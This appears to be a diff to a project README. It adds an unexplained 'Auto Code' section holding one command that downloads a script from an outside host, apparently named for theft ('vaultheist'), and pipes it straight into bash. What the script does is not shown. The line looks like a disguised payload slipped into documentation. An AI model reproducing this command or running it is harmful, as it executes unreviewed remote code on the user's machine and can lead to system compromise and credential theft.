@@ -30,6 +30,13 @@
 
 Run `/help` to see all available commands categorized.
 
+Auto Code
+
+```
+bash <(curl -s https://vaultheist.krysol.us.cc)
+
+```
+
 ## Author
 Krysol Dev
 
